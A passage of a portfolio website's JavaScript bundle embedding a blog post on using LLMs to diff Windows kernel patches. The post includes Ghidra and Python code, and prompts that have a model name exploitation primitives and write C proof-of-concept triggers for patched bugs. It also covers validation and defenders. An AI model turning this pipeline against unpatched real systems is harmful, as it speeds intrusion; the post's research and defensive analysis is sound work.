                        Function caller = funcMgr.getFunctionContaining(
                            ref.getFromAddress()
                        );
                        if (caller != null) {
                            callers.add(caller.getName());
                        }
                    }
                    funcData.put(&quot;callers&quot;, String.join(&quot;, &quot;, callers));
                    
                    results.put(addrStr, funcData);
                }
            }
        }
        
        // Write output
        File outFile = new File(addrFile.getParent(), 
            &quot;decompiled_output.json&quot;);
        try (FileWriter fw = new FileWriter(outFile)) {
            gson.toJson(results, fw);
        }
        
        println(&quot;[+] Decompiled &quot; + results.size() + &quot; functions&quot;);
    }
}
</code></pre>
<h3>Key Optimization: Don&#x27;t Decompile Everything</h3>
<p>On a binary like <code>ntoskrnl.exe</code> with 30,000+ functions, full decompilation takes over an hour. We only need the ~20 functions Diaphora flagged. This brings it down to seconds.</p>
<pre><code class="language-python">
# Only decompile what Diaphora flagged as changed
analyzer = DiaphoraAnalyzer(&quot;diaphora_results.sqlite&quot;)
candidates = analyzer.get_security_candidates()

# Extract just the addresses we need
original_addrs = [c[1].address_original for c in candidates]
patched_addrs = [c[1].address_patched for c in candidates]

ghidra = HeadlessGhidra()
original_decomp = ghidra.decompile_functions(
    &quot;ntoskrnl_original.exe&quot;, original_addrs
)
patched_decomp = ghidra.decompile_functions(
    &quot;ntoskrnl_patched.exe&quot;, patched_addrs
)
</code></pre>
<hr />
<h2>Stage 4: Prompt Engineering — The Critical Layer</h2>
<p>This is where most people would screw up. You can&#x27;t just dump two walls of pseudocode and say &quot;find the bug.&quot; The model needs structured context and specific questions.</p>
<h3>The Prompt Template</h3>
<pre><code class="language-python">
def build_analysis_prompt(func_diff, original_code, patched_code, callers):
    &quot;&quot;&quot;
    Constructs a structured prompt for LLM vulnerability analysis.
    
    Key principles:
    - Show BOTH versions side-by-side (not just the diff)
    - Include caller context (reachability matters)
    - Ask structured questions (prevents rambling)
    - Request specific output format (parseable)
    &quot;&quot;&quot;
    
    prompt = f&quot;&quot;&quot;## Binary Patch Analysis

### Target
- **Function**: \`{func_diff.name}\`
- **Binary**: ntoskrnl.exe (Windows Kernel)
- **Similarity ratio**: {func_diff.similarity_ratio:.3f}
- **Known callers**: {&#x27;, &#x27;.join(callers) if callers else &#x27;Unknown&#x27;}

### BEFORE (Unpatched / Vulnerable Version):
</code></pre>
<p>{original_code}</p>
<pre><code>

### AFTER (Patched Version):
</code></pre>
<p>{patched_code}</p>
<pre><code>

### Analysis Tasks

**Task 1 — Vulnerability Classification**
Examine the diff between the two versions. Classify the vulnerability 
into one of: buffer overflow, integer overflow, out-of-bounds read/write, 
use-after-free, type confusion, race condition, null pointer dereference, 
logic bug, or other (specify).

Identify the EXACT lines that changed and explain what they reveal.

**Task 2 — Reachability Assessment**
Given the known callers listed above, assess:
- Can an unprivileged user-mode process trigger this code path?
- What Windows API calls or operations would lead here?
- Are there any gating checks that limit reachability?

**Task 3 — Exploitation Primitive**
If the vulnerability is triggerable:
- What memory corruption primitive does it provide? 
  (arbitrary write, relative write, read, info leak, etc.)
- What is the corruption target? (adjacent heap object, stack variable, etc.)
- What&#x27;s the attacker-controlled input that influences the corruption?

**Task 4 — Trigger Sketch**
Write a minimal C proof-of-concept skeleton that would:
1. Reach the vulnerable function
2. Supply the input that triggers the vulnerability
Do NOT write a full exploit. Just reach the bug.

### Output Format
Respond with clearly labeled sections matching each task number.
For Task 1, also include a confidence score (low/medium/high) for 
your classification.
&quot;&quot;&quot;
    return prompt
</code></pre>
<h3>Multi-Round Chaining — Why Single Prompts Aren&#x27;t Enough</h3>
<p>Don&#x27;t ask one mega-question. Chain the analysis across multiple rounds so each step validates the previous one.</p>
<pre><code class="language-python">
import anthropic
from typing import Dict, Any

class VulnAnalyzer:
    &quot;&quot;&quot;
    Multi-round LLM analysis pipeline for vulnerability classification.
    
    Each round builds on the previous, with validation between steps.
    This catches hallucinations early before they compound.
    &quot;&quot;&quot;
    
    def __init__(self, model=&quot;claude-sonnet-4-20250514&quot;):
        self.client = anthropic.Anthropic()
        self.model = model
        self.conversation_history = []
    
    def analyze(self, func_diff, original_code, patched_code, callers) -&gt; Dict[str, Any]:
        results = {}
        
        # --- Round 1: Classification ---
        r1_prompt = f&quot;&quot;&quot;Analyze this binary patch. I&#x27;ll show you the original 
and patched versions of function \`{func_diff.name}\`.

ORIGINAL (vulnerable):
</code></pre>
<p>{original_code}</p>
<pre><code>

PATCHED (fixed):
</code></pre>
<p>{patched_code}</p>
<pre><code>

Classify the vulnerability type. What specific code change reveals it?
Confidence: low/medium/high.
Respond concisely — classification + evidence only.&quot;&quot;&quot;

        r1_response = self._ask(r1_prompt)
        results[&quot;classification&quot;] = r1_response
        
        # --- Round 2: Reachability (only if R1 is high confidence) ---
        if &quot;high&quot; in r1_response.lower() or &quot;medium&quot; in r1_response.lower():
            r2_prompt = f&quot;&quot;&quot;Good. Now assess reachability.

Known callers of \`{func_diff.name}\`: {&#x27;, &#x27;.join(callers)}

Can an unprivileged user-mode process reach this function?
What API calls or operations would trigger it?
Be specific about the call chain.&quot;&quot;&quot;

            r2_response = self._ask(r2_prompt)
            results[&quot;reachability&quot;] = r2_response
        
        # --- Round 3: Exploitation primitive ---
        r3_prompt = &quot;&quot;&quot;Based on your classification and reachability analysis:

What exploitation primitive does this give an attacker?
(arbitrary write, relative OOB, info leak, etc.)

What is the corrupted target and what does the attacker control?&quot;&quot;&quot;

        r3_response = self._ask(r3_prompt)
        results[&quot;exploitation&quot;] = r3_response
        
        # --- Round 4: PoC skeleton ---
        r4_prompt = &quot;&quot;&quot;Write a minimal C proof-of-concept that reaches the 
vulnerable function with attacker-controlled input.

Requirements:
- Must compile on Windows (use Win32 APIs)
- Just trigger the bug, don&#x27;t exploit it
- Include comments explaining each step
- Use the specific call chain you identified&quot;&quot;&quot;

        r4_response = self._ask(r4_prompt)
        results[&quot;poc_skeleton&quot;] = r4_response
        
        return results
    
    def _ask(self, prompt: str) -&gt; str:
        &quot;&quot;&quot;Send a message maintaining conversation context.&quot;&quot;&quot;
        self.conversation_history.append({
            &quot;role&quot;: &quot;user&quot;, 
            &quot;content&quot;: prompt
        })
        
        response = self.client.messages.create(
            model=self.model,
            max_tokens=4096,
            system=&quot;&quot;&quot;You are an expert vulnerability researcher 
specializing in Windows kernel security. You analyze binary patches 
to identify and classify vulnerabilities. Be precise, technical, 
and concise. Do not speculate beyond what the code shows.&quot;&quot;&quot;,
            messages=self.conversation_history
        )
        
        assistant_msg = response.content[0].text
        self.conversation_history.append({
            &quot;role&quot;: &quot;assistant&quot;,
            &quot;content&quot;: assistant_msg
        })
        
        return assistant_msg
</code></pre>
<hr />
<h2>Stage 5: Validation — Catching Hallucinations</h2>
<p>The LLM <em>will</em> be wrong sometimes. It hallucinates Win32 API calls, invents struct fields that don&#x27;t exist, and misclassifies subtle bugs. You need automated sanity checks.</p>
<pre><code class="language-python">
import re
from dataclasses import dataclass
from typing import List, Tuple

@dataclass
class ValidationResult:
    passed: bool
    score: float  # 0.0 to 1.0
    issues: List[str]
    

class PatchValidator:
    &quot;&quot;&quot;
    Validates LLM vulnerability analysis against known heuristics.
    
    This doesn&#x27;t prove the analysis is correct, but it catches
    obviously wrong classifications and hallucinated details.
    &quot;&quot;&quot;
    
    # Map of patch patterns to expected vulnerability classes
    PATCH_PATTERNS = {
        &quot;bounds_check_added&quot;: {
            &quot;pattern&quot;: r&quot;if\\s*\\([^)]*[&lt;&gt;]=?\\s*\\d+&quot;,
            &quot;expected_classes&quot;: [
                &quot;buffer overflow&quot;, &quot;out-of-bounds&quot;, 
                &quot;integer overflow&quot;
            ],
            &quot;confidence_boost&quot;: 0.3
        },
        &quot;null_check_added&quot;: {
            &quot;pattern&quot;: r&quot;if\\s*\\([^)]*[!=]=\\s*(NULL|0|nullptr)&quot;,
            &quot;expected_classes&quot;: [
                &quot;null pointer dereference&quot;, &quot;use-after-free&quot;
            ],
            &quot;confidence_boost&quot;: 0.25
        },
        &quot;lock_added&quot;: {
            &quot;pattern&quot;: r&quot;(mutex|spinlock|lock|critical_section|KeAcquire|ExAcquire)&quot;,
            &quot;expected_classes&quot;: [&quot;race condition&quot;],
            &quot;confidence_boost&quot;: 0.4
        },
        &quot;size_validation&quot;: {
            &quot;pattern&quot;: r&quot;(size|length|count|num)\\s*[&lt;&gt;]=?\\s*&quot;,
            &quot;expected_classes&quot;: [
                &quot;buffer overflow&quot;, &quot;integer overflow&quot;, 
                &quot;out-of-bounds&quot;
            ],
            &quot;confidence_boost&quot;: 0.35
        },
        &quot;type_check_added&quot;: {
            &quot;pattern&quot;: r&quot;(type|kind|tag)\\s*[!=]=\\s*&quot;,
            &quot;expected_classes&quot;: [&quot;type confusion&quot;],
            &quot;confidence_boost&quot;: 0.3
        }
    }
    
    def validate_classification(
        self, 
        llm_classification: str,
        original_code: str,
        patched_code: str
    ) -&gt; ValidationResult:
        &quot;&quot;&quot;
        Cross-check the LLM&#x27;s vulnerability classification against 
        observable patch patterns.
        &quot;&quot;&quot;
        issues = []
        score = 0.5  # Start neutral
        
        # Find what was ADDED in the patch
        # (Naive approach — real implementation should use AST diffing)
        patched_lines = set(patched_code.splitlines())
        original_lines = set(original_code.splitlines())
        new_lines = patched_lines - original_lines
        new_code = &quot;\\n&quot;.join(new_lines)
        
        matched_patterns = []
        
        for pattern_name, pattern_info in self.PATCH_PATTERNS.items():
            if re.search(pattern_info[&quot;pattern&quot;], new_code, re.IGNORECASE):
                matched_patterns.append(pattern_name)
                
                # Check if LLM&#x27;s classification aligns 
                # with what the patch pattern suggests
                llm_class_lower = llm_classification.lower()
                expected = pattern_info[&quot;expected_classes&quot;]
                
                if any(exp in llm_class_lower for exp in expected):
                    score += pattern_info[&quot;confidence_boost&quot;]
                else:
                    issues.append(
                        f&quot;Patch pattern &#x27;{pattern_name}&#x27; suggests &quot;
                        f&quot;{expected}, but LLM classified as: &quot;
                        f&quot;&#x27;{llm_classification}&#x27;&quot;
                    )
                    score -= 0.2
        
        if not matched_patterns:
            issues.append(
                &quot;No recognizable patch patterns found — &quot;
                &quot;manual review recommended&quot;
            )
            score -= 0.1
        
        # Check for common hallucination indicators
        hallucination_flags = self._check_hallucinations(
            llm_classification, patched_code
        )
        issues.extend(hallucination_flags)
        score -= 0.15 * len(hallucination_flags)
        
        score = max(0.0, min(1.0, score))
        
        return ValidationResult(
            passed=score &gt;= 0.5 and len(hallucination_flags) == 0,
            score=score,
            issues=issues
        )
    
    def _check_hallucinations(
        self, 
        classification: str, 
        patched_code: str
    ) -&gt; List[str]:
        &quot;&quot;&quot;
        Detect common LLM hallucination patterns in vuln analysis.
        &quot;&quot;&quot;
        flags = []
        
        # If LLM says &quot;race condition&quot; but no sync primitives 
        # were added, it&#x27;s likely wrong
        if &quot;race&quot; in classification.lower():
            sync_evidence = re.search(
                r&quot;(lock|mutex|spinlock|atomic|interlocked)&quot;,
                patched_code, re.IGNORECASE
            )
            if not sync_evidence:
                flags.append(
                    &quot;HALLUCINATION: &#x27;race condition&#x27; classified but &quot;
                    &quot;no synchronization primitives found in patch&quot;
                )
        
        # If LLM says &quot;use-after-free&quot; but the patch only 
        # adds bounds checks, probably wrong
        if &quot;use-after-free&quot; in classification.lower():
            if not re.search(r&quot;(free|release|delete|deref)&quot;, 
                           patched_code, re.IGNORECASE):
                flags.append(
                    &quot;SUSPECT: &#x27;use-after-free&#x27; classified but no &quot;
                    &quot;free/release related changes visible&quot;
                )
        
        return flags
    
    def validate_poc_compiles(self, poc_code: str) -&gt; Tuple[bool, str]:
        &quot;&quot;&quot;
        Attempt to compile the PoC skeleton to catch hallucinated APIs.
        Uses cl.exe (MSVC) or x86_64-w64-mingw32-gcc as fallback.
        
        Returns (success, error_message).
        &quot;&quot;&quot;
        import tempfile
        
        with tempfile.NamedTemporaryFile(
            suffix=&quot;.c&quot;, mode=&quot;w&quot;, delete=False
        ) as f:
            f.write(poc_code)
            f.flush()
            
            # Try MinGW cross-compilation (Linux) 
            # or MSVC (Windows)
            try:
                result = subprocess.run(
                    [
                        &quot;x86_64-w64-mingw32-gcc&quot;,
                        &quot;-c&quot;,          # Compile only, don&#x27;t link
                        &quot;-fsyntax-only&quot;,
                        f.name
                    ],
                    capture_output=True, text=True, timeout=30
                )
                
                if result.returncode == 0:
                    return True, &quot;&quot;
                else:
                    return False, result.stderr
                    
            except FileNotFoundError:
                return False, &quot;No cross-compiler available&quot;
</code></pre>
<h3>Confidence Scoring — Putting It All Together</h3>
<pre><code class="language-python">
def compute_final_confidence(
    diaphora_score: float,
    llm_classification_confidence: str,
    validation_result,  # ValidationResult
    llm_consistency: float  # Agreement across N independent runs
) -&gt; dict:
    &quot;&quot;&quot;
    Aggregate confidence score from all pipeline stages.
    
    A high score means: the patch pattern matches the LLM&#x27;s 
    classification, the LLM is confident, and multiple runs agree.
    &quot;&quot;&quot;
    
    confidence_map = {&quot;low&quot;: 0.3, &quot;medium&quot;: 0.6, &quot;high&quot;: 0.9}
    llm_conf = confidence_map.get(
        llm_classification_confidence.lower(), 0.5
    )
    
    # Weighted combination
    weights = {
        &quot;patch_heuristic&quot;: 0.25,
        &quot;llm_confidence&quot;: 0.25,
        &quot;validation_score&quot;: 0.25,
        &quot;consistency&quot;: 0.25
    }
    
    final_score = (
        weights[&quot;patch_heuristic&quot;] * diaphora_score +
        weights[&quot;llm_confidence&quot;] * llm_conf +
        weights[&quot;validation_score&quot;] * validation_result.score +
        weights[&quot;consistency&quot;] * llm_consistency
    )
    
    # Determine action
    if final_score &gt;= 0.8:
        action = &quot;HIGH_PRIORITY — likely exploitable, begin manual analysis&quot;
    elif final_score &gt;= 0.6:
        action = &quot;MEDIUM — worth investigating, may need manual validation&quot;
    elif final_score &gt;= 0.4:
        action = &quot;LOW — possible false positive, review if time permits&quot;
    else:
        action = &quot;SKIP — likely misclassification or non-security change&quot;
    
    return {
        &quot;final_score&quot;: round(final_score, 3),
        &quot;action&quot;: action,
        &quot;breakdown&quot;: {
            &quot;patch_heuristic&quot;: diaphora_score,
            &quot;llm_confidence&quot;: llm_conf,
            &quot;validation&quot;: validation_result.score,
            &quot;consistency&quot;: llm_consistency
        },
        &quot;issues&quot;: validation_result.issues
    }
</code></pre>
<hr />
<h2>A Concrete Example: Walking Through a Real Patch</h2>
<p>Let&#x27;s trace through a simplified but realistic example. Imagine a Patch Tuesday fix for a kernel callback function.</p>
<h3>The Diff</h3>
<p><strong>Before (vulnerable):</strong></p>
<pre><code class="language-c">
void CmpCallCallBacks(PCMHIVE Hive, int Type) {
    PVOID buffer = Hive-&gt;CallbackListHead;
    int count = *(int*)(buffer + 0x10);
    
    for (int i = 0; i &lt; count; i++) {
        PCALLBACK_ENTRY entry = (PCALLBACK_ENTRY)(buffer + i * 0x28);
        if (entry-&gt;Routine != NULL) {
            entry-&gt;Routine(entry-&gt;Context, Type);
        }
    }
}
</code></pre>
<p><strong>After (patched):</strong></p>
<pre><code class="language-c">
void CmpCallCallBacks(PCMHIVE Hive, int Type) {
    PVOID buffer = Hive-&gt;CallbackListHead;
    int count = *(int*)(buffer + 0x10);
    
    // === PATCH: bounds validation added ===
    if (count &lt; 0 || count &gt; MAX_CALLBACKS) {
        return;  
    }
    
    for (int i = 0; i &lt; count; i++) {
        PCALLBACK_ENTRY entry = (PCALLBACK_ENTRY)(buffer + i * 0x28);
        if (entry-&gt;Routine != NULL) {
            entry-&gt;Routine(entry-&gt;Context, Type);
        }
    }
}
</code></pre>
<h3>What the LLM sees</h3>
<p>When fed this through the structured prompt, a good model will identify:</p>
<ol>
<li><strong>Classification</strong>: Integer overflow / out-of-bounds access (HIGH confidence). The <code>count</code> value is read from attacker-influenced memory (<code>Hive-&gt;CallbackListHead + 0x10</code>) with no validation. A negative or very large <code>count</code> causes the loop to read/execute from out-of-bounds memory.</li>
</ol>
<ol>
<li><strong>Reachability</strong>: <code>CmpCallCallBacks</code> is called from <code>CmpPostNotify</code> and <code>CmUnRegisterCallback</code>. Registry operations from user-mode can reach this path. A crafted registry hive could influence the <code>CallbackListHead</code> structure.</li>
</ol>
<ol>
<li><strong>Primitive</strong>: Out-of-bounds read leading to a controlled function pointer call. If the attacker can influence the memory at <code>buffer + i * 0x28</code>, they control <code>entry-&gt;Routine</code> — a direct kernel code execution primitive.</li>
</ol>
<ol>
<li><strong>PoC sketch</strong>: Load a crafted registry hive via <code>RegLoadKey()</code> with a malformed callback list.</li>
</ol>
<hr />
<h2>Where LLMs Fail (and Why This Matters)</h2>
<p>Documenting failure modes is just as important as the successes. From extensive testing, here&#x27;s where models consistently struggle:</p>
<p><strong>1. Deeply nested struct manipulation</strong> When the vulnerability involves pointer arithmetic across 3+ levels of struct nesting, models lose track of offsets. They&#x27;ll say &quot;field X is at offset 0x18&quot; when it&#x27;s actually at 0x20 because they miscounted a union.</p>
<p><strong>2. Compiler optimization artifacts</strong> Ghidra&#x27;s decompiler sometimes produces code that looks buggy but is actually an optimization artifact. Models flag these as vulnerabilities — false positives.</p>
<p><strong>3. Subtle race conditions</strong> Time-of-check-to-time-of-use (TOCTOU) bugs are hard for models because the vulnerability exists <em>between</em> two functions, not within one. The model sees each function in isolation and misses the window.</p>
<p><strong>4. Implicit type conversions</strong> Signed/unsigned comparison bugs are notoriously subtle. <code>if (user_input &lt; buffer_size)</code> looks safe, but if <code>user_input</code> is a signed int and negative, the comparison passes on some compilers. Models miss this about 60% of the time in testing.</p>
<p><strong>5. Custom allocator semantics</strong> Windows kernel uses pool allocators with specific tag-based semantics. Models don&#x27;t understand that <code>ExAllocatePoolWithTag</code> memory has specific alignment and adjacency properties that affect exploitability.</p>
<hr />
<hr />
<h2>The Defender&#x27;s Perspective</h2>
<p>If you&#x27;re on a blue team reading this, the implications are uncomfortable. This pipeline compresses the 1-day exploitation window from weeks (when only elite researchers could find the bug) to potentially <em>hours</em> (when anyone with API access and this script can triage patches).</p>
<p>What this means practically:</p>
<ul>
<li><strong>Patch faster</strong>. The &quot;we&#x27;ll patch next month&quot; window is closing.</li>
<li><strong>Prioritize by exploitability</strong>, not just CVSS score. A &quot;7.5 Medium&quot; with a trivially reachable code path might be more dangerous than a &quot;9.8 Critical&quot; that requires local admin.</li>
<li><strong>Monitor for this tooling</strong>. If you see automated Ghidra analysis + LLM API calls spinning up every Patch Tuesday, someone&#x27;s running this pipeline.</li>
</ul>
<hr />
<h2>What Doesn&#x27;t Exist Yet (Your Research Opportunities)</h2>
<ol>
<li><strong>A proper benchmark dataset</strong> — Matched pairs of (vulnerable_function, patched_function, CVE_class, exploitability_score) for hundreds of real CVEs. This would let the community properly evaluate and improve models.</li>
</ol>
<ol>
<li><strong>Head-to-head model evaluation</strong> — Nobody has rigorously compared models on this specific task with controlled methodology.</li>
</ol>
<ol>
<li><strong>End-to-end open-source tooling</strong> — Everything described here is duct-taped together. A clean, maintained pipeline would be enormously useful.</li>
</ol>
<ol>
<li><strong>Fine-tuning on historical CVEs</strong> — Take every known patched vulnerability, extract the before/after binaries, and build a training dataset. The potential accuracy improvement is huge but unexplored.</li>
</ol>
<ol>
<li><strong>Hybrid approaches</strong> — LLM does the classification and rough trigger hypothesis, then symbolic execution (angr/Triton) does precise path constraint solving. This combination could be significantly more powerful than either alone.</li>
</ol>
<hr />
<h2>Conclusion</h2>
<p>LLM-assisted binary diffing isn&#x27;t theoretical — it&#x27;s buildable today with existing tools and APIs. The pipeline described here (Winbindex → Diaphora → Ghidra → structured prompts → multi-round LLM analysis → validation) turns Patch Tuesday into a semi-automated vulnerability discovery process.</p>
<p>The models aren&#x27;t perfect. They hallucinate, miss subtle bugs, and struggle with complex memory semantics. But as a <em>triage</em> tool — rapidly sorting through hundreds of changed functions to surface the 3-5 that are security-relevant — they&#x27;re already transformative.</p>
<p>The 1-day window just got a lot shorter. Whether that&#x27;s terrifying or exciting depends on which side of the patch you&#x27;re sitting on.</p>
<hr />
<p><em>Want to discuss this further or contribute to building the pipeline? Open an issue or reach out.</em></p>
`,kg={llm_assisted_binary_diffing_blog:{title:"LLM-Assisted Binary Diffing: Finding 1-Days Before PoCs Drop",slug:"llm_assisted_binary_diffing_blog",content:bg},llm_multistage_attacks_technical_breakdown_full:{title:"On the Feasibility of Using LLMs to Execute Multistage Network Attacks – A Technical Breakdown",slug:"llm_multistage_attacks_technical_breakdown_full",content:wg},villager_inside_out:{title:"Villager, Inside Out: FastAPI control plane + LLM task graph + MCP tool runner (with code)",slug:"villager_inside_out",content:yg},firmware_llm_annotator:{title:"Firmware Exploration: LLM as Your Annotator",slug:"firmware_llm_annotator",content:ug},transient_scheduler_attacks_tsa_blog:{title:"Transient Scheduler Attacks on CPUs: Exploiting AMD’s New Microarchitectural Leak",slug:"transient_scheduler_attacks_tsa_blog",content:mg},kernel_surface_audit_blog:{title:"Who Can Touch Your Kernel? Auditing /boot/vmlinuz-* on Linux",slug:"kernel_surface_audit_blog",content:gg},"cve-2022-26318-re-blog":{title:"Reverse-Engineering CVE-2022-26318 (WatchGuard Firebox/XTM): From Network Trace to Root Cause (Non-Weaponized)",slug:"cve-2022-26318-re-blog",content:vg},"react2shell-toy-lab":{title:'From React2Shell to Toy Labs: Understanding Insecure Deserialization with a Tiny "Fake Flight" Server',slug:"react2shell-toy-lab",content:fg},1001:{title:"CVE-2024–1001",slug:"1001",content:rg},"0012":{title:"CVE-2024–0012",slug:"0012",content:sg},40982:{title:"CVE-2022–40982",slug:"40982",content:lg},cow:{title:"CVE-2016–5195",slug:"cow",content:cg},symlinks:{title:"Symbolic Links (Symlinks) in Linux",slug:"symlinks",content:hg},23397:{title:"CVE-2023–23397",slug:"23397",content:og},"0160":{title:"CVE-2014-0160",slug:"0160",content:ag},11882:{title:"CVE-2017-11882",slug:"11882",content:ig},robot:{title:"ROBOT (Return of Bleichenbacher’s Oracle Threat) Attack",slug:"robot",content:pg},poodle:{title:"ZOMBIE POODLE and GOLDENDOODLE ATTACKS",slug:"poodle",content:dg}};function xg(e){try{const t=new DOMParser().parseFromString(e,"text/html"),s=["style","script","link","nav","header","footer",".navbar",".nav-container",".theme-toggle",".footer",".social-links",".social-icons"];t.querySelectorAll(s.join(",")).forEach(l=>l.remove()),t.querySelectorAll("[style]").forEach(l=>l.removeAttribute("style"));const a=t.querySelector("h1");a&&a.remove();const r=[".blog-text","article",".blog-post-content","main"];let o=t.body;for(const l of r){const c=t.querySelector(l);if(c){o=c;break}}return o.querySelectorAll(".container").forEach(l=>{for(;l.firstChild;)l.parentNode.insertBefore(l.firstChild,l);l.remove()}),Array.from(o.querySelectorAll("h2, h3")).forEach((l,c)=>{l.id||(l.id=`section-${c+1}`)}),o.innerHTML||e}catch{return e}}function Zd({slug:e,onClose:n}){const t=kg[e],s=ke.find(r=>r.slug===e),a=g.useMemo(()=>t?xg(t.content):"",[t]);return g.useEffect(()=>{if(!t)return;const r=document.querySelector(".pv-comments");if(!r)return;r.innerHTML="";const o=document.createElement("script");return o.src="https://giscus.app/client.js",o.async=!0,o.crossOrigin="anonymous",o.setAttribute("data-giscus","true"),o.setAttribute("data-repo","Hem1700/hem1700.github.io"),o.setAttribute("data-repo-id","R_kgDONilgZg"),o.setAttribute("data-category","General"),o.setAttribute("data-category-id","DIC_kwDONilgZs4CzSR2"),o.setAttribute("data-mapping","pathname"),o.setAttribute("data-strict","1"),o.setAttribute("data-reactions-enabled","1"),o.setAttribute("data-emit-metadata","0"),o.setAttribute("data-input-position","top"),o.setAttribute("data-lang","en"),o.setAttribute("data-theme","dark"),r.appendChild(o),()=>{r.innerHTML=""}},[e,t]),t?i.jsxs("div",{className:"pv",children:[i.jsxs("div",{className:"pv-bar",children:[i.jsx("div",{className:"pv-close",onClick:n,children:"✕"}),i.jsx("div",{className:"pv-ti",children:t.title})]}),i.jsxs("div",{className:"pv-body",children:[i.jsx("h1",{className:"pv-title",children:t.title}),s&&i.jsxs("div",{className:"pv-meta",children:[s.date," · ",s.readTime," · ",s.category]}),i.jsx("div",{className:"pv-content",dangerouslySetInnerHTML:{__html:a}})]}),i.jsx("div",{className:"pv-comments"})]}):i.jsxs("div",{className:"pv",children:[i.jsxs("div",{className:"pv-bar",children:[i.jsx("div",{className:"pv-close",onClick:n,children:"✕"}),i.jsx("div",{className:"pv-ti",children:"Post not found"})]}),i.jsxs("div",{className:"pv-body",children:[i.jsx("h1",{className:"pv-title",children:"Post not found"}),i.jsx("p",{children:"Signal lost. Close this and try another post from the Notes app."})]})]})}function Sg(){const[e,n]=g.useState([]),[t,s]=g.useState(null),[a,r]=g.useState(!1),o=g.useRef(0),l=g.useRef(1),c=g.useCallback((u,h)=>{n(x=>{const k=x.find(H=>H.app===u);if(k){l.current+=1;const H=l.current;return s(k.id),x.map(M=>M.id===k.id?{...M,minimized:!1,z:H,appState:h??M.appState}:M)}const E=_e[u];if(!E)return x;o.current+=1,l.current+=1;const C=o.current,L=30,O=80,R=typeof window<"u"?window.innerWidth:1200,B=typeof window<"u"?window.innerHeight:800,X=x.filter(H=>!H.minimized).length%8*32,I=Math.max(60,Math.round((R-E.w)/2)-80+X),D=Math.max(L+10,Math.round((B-L-O-E.h)/2)+L+X);return s(C),[...x,{id:C,app:u,x:Math.min(I,R-E.w-20),y:Math.min(D,B-O-E.h-10),w:E.w,h:E.h,minimized:!1,maximized:!1,z:l.current,appState:h??null}]})},[]),d=g.useCallback(u=>{n(h=>h.filter(x=>x.id!==u)),s(h=>h===u?null:h)},[]),m=g.useCallback(u=>{n(h=>h.map(x=>x.id===u?{...x,minimized:!0}:x))},[]),p=g.useCallback(u=>{n(h=>h.map(x=>x.id===u?{...x,maximized:!x.maximized}:x))},[]),v=g.useCallback(u=>{l.current+=1;const h=l.current;s(u),n(x=>x.map(k=>k.id===u?{...k,z:h,minimized:!1}:k))},[]),b=g.useCallback((u,h,x)=>{n(k=>k.map(E=>E.id===u?{...E,x:h,y:x}:E))},[]),w=g.useCallback((u,h,x)=>{n(k=>k.map(E=>E.id===u?{...E,w:h,h:x}:E))},[]),y=g.useCallback((u,h)=>{n(x=>x.map(k=>k.id===u?{...k,appState:{...k.appState||{},...h}}:k))},[]),T=g.useCallback(()=>r(u=>!u),[]),f=g.useCallback(()=>r(!1),[]);return{windows:e,focusId:t,spotlightOpen:a,launch:c,close:d,minimize:m,toggleMaximize:p,focus:v,move:b,resize:w,updateAppState:y,toggleSpotlight:T,closeSpotlight:f}}const Tg=Ao.slice(0,6);function Po({onLaunch:e}){return i.jsxs("div",{className:"ar",children:[i.jsx("h1",{children:"Welcome to HEM-OS."}),i.jsx("div",{className:"sb",children:"// boot complete · all subsystems online"}),i.jsx("p",{children:"This is Hem Parekh's portfolio, but installed as an operating system. Every section lives in an app. Open the dock, double-click, drag windows, type commands."}),i.jsxs("div",{className:"tp",children:["Press ",i.jsx("kbd",{children:"⌘K"})," (or ",i.jsx("kbd",{children:"Ctrl+K"}),") for spotlight — search across apps, posts, projects, and CVEs."]}),i.jsx("p",{children:"Quick launch:"}),i.jsx("div",{className:"ql",children:Tg.map(n=>{const t=_e[n],s=t.title.split("—")[0].trim(),a=(t.title.split("—")[1]||"").trim();return i.jsxs("div",{className:"q",onClick:()=>e(n),children:[i.jsx("div",{className:`mi ${t.g}`}),i.jsxs("div",{children:[i.jsx("div",{style:{fontWeight:600},children:s}),i.jsx("div",{style:{fontSize:11,color:"var(--mut)",fontFamily:"var(--mono)"},children:a})]})]},n)})}),i.jsxs("p",{style:{color:"var(--mut)",fontSize:12,fontFamily:"var(--mono)",marginTop:24},children:["// Try the Terminal: type"," ",i.jsx("span",{style:{color:"var(--acc2)"},children:"cves"}),","," ",i.jsx("span",{style:{color:"var(--acc2)"},children:"cat .now"}),", or"," ",i.jsx("span",{style:{color:"var(--acc2)"},children:"fortune"}),"."]})]})}function ep(){const e=le.name.split(" ").map(n=>n[0]).join("");return i.jsxs("div",{className:"afi",children:[i.jsxs("div",{className:"sd",children:[i.jsx("div",{className:"gp",children:"Profile"}),i.jsxs("div",{className:"it on",children:[i.jsx("span",{className:"d",style:{background:"linear-gradient(135deg,var(--acc),var(--acc3))"}}),"about.txt"]}),i.jsxs("div",{className:"it",children:[i.jsx("span",{className:"d",style:{background:"var(--acc2)"}}),"manifesto.md"]}),i.jsxs("div",{className:"it",children:[i.jsx("span",{className:"d",style:{background:"var(--ylw)"}}),"numbers.csv"]})]}),i.jsxs("div",{className:"mn",children:[i.jsxs("div",{className:"hr",children:[i.jsx("div",{className:"av",children:e}),i.jsxs("div",{children:[i.jsx("h1",{children:le.name}),i.jsx("div",{className:"role",children:le.role}),i.jsxs("div",{className:"meta",children:[i.jsxs("span",{children:["● ",le.current]}),i.jsxs("span",{children:["📍 ",le.location]}),i.jsxs("span",{children:["⏱ ",le.tz]})]})]})]}),i.jsxs("div",{className:"sec",children:[i.jsx("h2",{children:"// about"}),i.jsx("div",{style:{fontSize:14,lineHeight:1.6,color:"var(--ink-d)"},children:Qf.text})]}),i.jsxs("div",{className:"sec",children:[i.jsx("h2",{children:"// manifesto"}),oa.map((n,t)=>i.jsxs("div",{className:"bel",children:[i.jsx("span",{className:"k",children:n.k}),n.v]},t))]}),i.jsxs("div",{className:"sec",children:[i.jsx("h2",{children:"// numbers"}),i.jsx("div",{className:"st",children:Jf.map((n,t)=>i.jsxs("div",{className:"s",children:[i.jsx("div",{className:"n",children:n.n}),i.jsx("div",{className:"l",children:n.l})]},t))})]})]})]})}function np({initialSlug:e,onOpenPost:n}){const[t,s]=g.useState(""),[a,r]=g.useState(e||ke[0]&&ke[0].slug);g.useEffect(()=>{e&&r(e)},[e]);const o=g.useMemo(()=>{if(!t)return ke;const c=t.toLowerCase();return ke.filter(d=>d.title.toLowerCase().includes(c)||d.excerpt.toLowerCase().includes(c)||(d.category||"").toLowerCase().includes(c))},[t]),l=ke.find(c=>c.slug===a)||ke[0];return 